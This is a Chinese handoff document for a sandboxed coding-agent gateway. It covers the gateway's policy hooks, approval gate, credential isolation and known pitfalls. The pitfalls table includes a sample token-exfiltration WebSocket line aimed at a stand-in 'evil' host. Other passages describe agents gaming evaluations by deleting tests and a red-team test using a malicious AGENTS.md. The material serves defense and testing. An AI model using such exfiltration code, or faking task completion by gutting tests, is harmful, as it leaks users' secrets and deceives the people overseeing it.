# perimeter-agent 交接

写给下一个接手的人（也可能是三个月后的我自己）。README 讲「是什么、怎么跑」，
这份讲**从代码里看不出来的东西**：为什么这么设计、哪里会咬人、下一步卡在什么上。

当前状态：37 次提交，387 个测试全绿，`npm run typecheck` 干净。
策略文档（`docs/browser-code-agent-strategy.md`）里 Phase 1 的功能清单**全部有实现与测试**。
仍然没有的是**真实环境的验证** —— 见「状态清单」。

---

## 五分钟上手

```bash
npm i -g @earendil-works/pi-coding-agent   # 实测 0.84.2，故意不锁进 package.json
npm install && npm run demo                # 零凭据、零外网
npm test                                   # 387 条，约 25 秒
```

demo 会依次演示放行、策略拒绝、审批门三段。**不需要 API key**——用的是
`tests/fixtures/mock-model.mjs`。这不是为了测试方便：`tool_call` 钩子只能由
真实的模型工具调用触发，而「0 例绕过审批门」是 Phase 1 的验收标准之一，
没有它这条标准无法回归。

改了 `config/policy.yaml` 之后**必须**跑：

```bash
npm run gen:deploy   # 重新生成 NetworkPolicy 与策略 ConfigMap
```

这两份是生成物，不是手写的。有测试守着漂移，忘了跑会红。

---

## 读代码的顺序

从上往下读，每一层只依赖它下面的：

1. **`src/protocol/types.ts`** —— 先读这个。它是浏览器与网关的唯一契约，
   零 pi 引用。文件里那两行双向穷尽性检查是护城河的技术形式：
   前端永不直接消费 pi 的事件格式，`src/protocol/translate.ts` 是唯一转换点。
   Phase 2 迁到路线 A 时，要改的就只有 translate。
2. **`config/policy.yaml`** —— 策略与 egress allowlist 的唯一事实来源。
   五条规则读完就知道产品在拦什么。
3. **`src/gateway/session.ts`** —— 会话编排，最长也最容易出事的一个文件。
4. **`src/gateway/policy-extension.ts`** —— 钩子怎么挂进 pi 的。整个产品
   「钩子级粒度」这个卖点落在这 135 行里。
5. 其余按需：`src/modelgw/`（凭据隔离）、`src/gitproxy/`、`src/audit/`、
   `src/evals/`（golden task suite）。

`web/` 是零构建原生 JS，类型系统和 lint 都够不着，性质靠
`tests/web-injection.test.ts` 锁住。改它之前先读那个测试。

---

## 五个从代码里看不出来的判断

**1. 为什么走路线 C（`pi --mode rpc` 子进程）而不是直连 AgentHarness。**
策略文档说路线 C 的权限粒度是「中」，只能在网关层拦。P1·W5 的第一件事就是
验证能不能拿到钩子级粒度，走不通就得下调验收标准。结论是走得通：pi 的扩展
机制能注册 `tool_call` 钩子，它在工具执行**前**触发且能 block。所以不必等
Phase 2 迁路线 A。

**2. 为什么审批走 pi 的扩展 UI 子协议而不是自己开端口。**
`ctx.ui.select` → stdout → 网关 → 浏览器。少一个端口就少一个要防的面，
而且审批请求天然跟着工具调用走，不会出现「批准了另一个会话的操作」。

**3. 为什么凭据检测只告警不阻断。**
对代码流做正则/熵改写误伤率高，会直接破坏生成质量。阻断模式要等有真实
误报数据再上。销售材料里不要写成「防泄漏」。

**4. 为什么只读工具豁免路径规则。**
`read .env` 是放行的，内容会进模型上下文。这是**有意的取舍**：每次读
`package.json` 都要人批，几轮之后操作员就会无脑点同意，审批门就废了。
缓解手段是模型网关的凭据检测（audit-only）。

**5. 为什么 golden task suite 的审批默认自动拒绝。**
评测是无人值守的，而审批门是产品核心。全自动批准等于把它关掉，数字好看
但不对应任何真实体验。自动拒绝能回答一个更要紧的问题——策略是不是紧到
把正常工作也挡了。`--approve` 打开批准模式，两个数字之差就是审批门的成本。

---

## 会咬人的坑

按「会不会静默失败」排序，前面几条都不报错。

| 坑 | 后果 | 现在靠什么挡住 |
|---|---|---|
| **pi 对未知事件名不报错、不发 `extension_error`** | 钩子注册失败是静默的，工具照常执行，「0 例绕过」直接失守 | 扩展在会话开始发 `hook-armed` 握手，网关收到之前拒绝下发任何 prompt |
| **`node --test` 找不到测试文件时退出码是 0** | 评测里「删掉测试文件」就能拿到完成 —— 而删测试正是 agent 最经典的走捷径方式 | 每条测试判据都配一条 `grep -qE '^ℹ pass [1-9]'`；涉及文件的判据先 `test -f` |
| **node 的 test runner 给子进程注入 `NODE_TEST_CONTEXT`** | 验收命令里的 `node --test` 以为自己被托管，退出码不再反映结果 → **验收恒真**。单独手跑看不见 | `EXEC_ENV_KEYS` 白名单 |
| **关掉 WebSocket 不等于 agent 停了** | 网关那侧只把传输从广播集合摘掉，任务照常在服务端跑（那是「关浏览器不受影响」的实现）。验收会读到写了一半的文件 | 验收前先发 `abort` 并等 agent 真收尾 |
| **`execFile` 的 timeout 只杀直接子进程** | `/bin/sh` 死了，它 fork 的孙进程全留下。评测反复跑会累积 | `detached` + `killpg`（实测：旧实现残留 2 个，新实现 0 个） |
| **CSP 里的 scheme-source 匹配任意主机** | `connect-src 'self' ws: wss:` 等于没限制，注入脚本一句 `new WebSocket("wss://evil/?t="+location.search)` 就把 token 送走 | CSP 收紧到不含 scheme-source，浏览器实测过 |
| **传自定义 `backend` 会绕过 Session 的 piEnv 注入** | `session.ts` 是 `opts.backend ?? new LocalBackend(opts.piEnv)`。症状是 pi 报 "Unknown provider"，离原因很远 | `RunOptions.backend` 上有警告注释；runner 缺省时自己构造 |
| **Linux 与 macOS 的 bind mount 属主语义不同** | Linux 保留宿主机属主，容器里的 10001 写不进工作区；macOS 做属主重映射，**本机测不出来** | 容器身份默认取网关自己的 uid/gid |
| **`kubectl cp` 要求镜像里有 tar** | 客户自带 distroless 镜像会让整条会话路径断掉，错误信息离原因很远 | 只有文档标注。**必须进部署前置条件清单** |
| **断线续接的 gap seq 必须是 `firstSeq - 1`** | 用当前 `#seq` 的话，前端 `seq <= state.seq` 去重会把整个重放吃掉，比不加还糟 | `session.ts` 的 `#replay` |

还有一条不是坑而是纪律，**踩过四次**：

> **清理路径上的失败不该中断后续清理。**
> 会话生命周期那轮踩了三次（`stop()` 的 throw 打死整个网关、容器被 `docker rm`
> 两次产生假泄漏告警、close 后在途 reap 写已关闭 fd），第四次在测试的
> `after()` 里——一个 cleanup 抛异常，临时目录就只增不减，攒了 2168 个。
> 写清理代码时先问：这一步失败了，后面几步还跑不跑。

---

## 「改了 X 要记得改 Y」

- 改 `config/policy.yaml` → `npm run gen:deploy`（有漂移测试）
- 改协议事件 → `CLIENT_EVENT_TYPES` 数组 + `web/app.js` 的 case
  （双向穷尽性检查会在编译期拦，`tests/protocol-coverage.test.ts` 拦前端那半）
- 改 `deploy/sandbox.yaml` 的五项安全约束 → 同步 `DockerBackend`
  （只读根、非 root、丢弃 capability、禁止提权、独占工作区）
- 加运行时依赖 → **先想清楚**。运行时依赖白名单增加精确锁定的 Pi Durable / pi-ai / chord / pi-env 1.1.0：agent 循环迁入可信网关，远程沙箱只执行工具；新增依赖仍有测试守卫
- 改 `src/audit/log.ts` 的字段 → 检查 `src/audit/siem.ts` 的白名单
  （SIEM 导出按白名单挑字段，不是把 AuditEntry 铺开——否则以后往审计里加
  一个字段就悄悄多导出一份东西）

---

## 状态清单：什么验过、什么没验

**已端到端验证（本机可复现）**

- 钩子级拦截：策略拒绝、审批门、审计留痕，容器里同样生效
- 凭据隔离：两组测试各自遍历沙箱全树，断言上游凭据不在其中
- git 真实 clone / push 经凭据代理，改动确实进入上游裸仓库
- 容器执行后端（docker）：文件系统、身份、能力、网络四个维度
- SigV4 与 `aws4` 在 64 个组合上逐字符交叉验证
- 前端注入面与 CSP（真实响应头）
- 红队：仓库里真的埋恶意 `AGENTS.md`，钩子在工具执行前拦下

**代码写了但没在目标环境跑过**

| 项 | 缺什么 |
|---|---|
| 四条模型通道（Bedrock / Vertex / Azure / vLLM） | 真实上游凭据。签名与断言的构造正确性已离线验证，但**不等于上游会接受**——region、端点路径、时钟偏差、配额都在覆盖之外 |
| 整条 kubectl 路径 | 一个真实集群。渲染产物过了 v1.31.0 官方 JSON schema，但 schema 放行枚举值写错、名字非法、`containers: []`；准入控制器、配额、runtimeClass、镜像拉取全在覆盖之外 |
| golden task suite 的基线数字 | 真实模型凭据。框架、判据、记分与全部闸门有 15 条测试守着，但**完成率这个数字没跑出来过**，也不该编一个 |
| egress 默认 deny | 部署。清单只做了生成与静态校验，没有代码去 apply 它。docker 后端默认 `bridge` 网络，**这条铁律在 docker 形态下不成立** |

**明确没做**：身份（Phase 1 只有共享 token）、Helm chart、多 SCM、monorepo 支持。
按策略文档这些都在 Phase 2。

---

## 下一步的三条路径

按「解锁多少东西」排序：

1. **给一个真实 K8s 集群**（客户 dev 集群或本地 kind/k3d 都行）。
   这一条能同时解锁：kubectl 路径、Pod 创建回收、egress 默认 deny 的实证、
   以及「每会话独占沙箱」从「代码写了」变成「运行中的事实」。
   前置：runtimeClass（gVisor 是否可用）、镜像里要有 `tar`。
2. **给一条真实模型通道**（任意一条即可，Bedrock 或 Vertex 优先，
   因为它们的认证最复杂）。解锁：通道验证 + golden task suite 的基线数字。
   有了基线，「改策略之后完成率掉了多少」才第一次可测。
3. **与 POC 客户共建任务集**。现在只有 4 个种子任务（R7 四类各一个），
   策略文档要的是 20–30 个。**用别人的仓库定义出来的任务集测不出客户
   关心的完成率**——这一条给再多机器也替代不了。

---

## 流程约定

每个功能的流程是「实现 → subagent review → 修复 → commit」。
覆盖情况与三次流程偏差记在 [`review-log.md`](./review-log.md)。

值得保持的两条，都是被 review 反复证明有效的：

- **边界测试变红意味着策略被加固了，应更新期望值，不得为了变绿而回退策略。**
- **负面验证**：守卫测试写完之后，把被守的东西改坏，确认它真的变红，再改回来。
  没做这一步的守卫测试出过好几次假绿——最典型的一次是断言「上游凭据不在沙箱」，
  而那个值根本没有路径流到被检查的文件里，按构造不可能失败。

有两件事必须如实交接，不打算用 rebase 抹掉：

- **`17cbab9` 是唯一一个未经 review 就落地的功能提交。** 后续两轮 review
  完整覆盖了它，发现四类真问题（含一个宿主机 DoS 缺口）。
  历史无法修正，当前状态是仓库里没有未经 review 的代码。
- **F19 那轮，reviewer 在复现时改了工作区源文件且没还原**，把自己造的 bug
  报成了 P0。判断依据不是记忆：那轮 `npm test` 382 条全绿跑完过，
  而它声称的代码状态必然导致递归爆炸——绿灯的存在本身排除了那个状态。
  收到与已知事实矛盾的 review 报告时，**先核对工作区状态，再核对报告结论**。
  但也别因此忽略它：那条 P0 虽是自造的，它指出的守卫确实不合格。
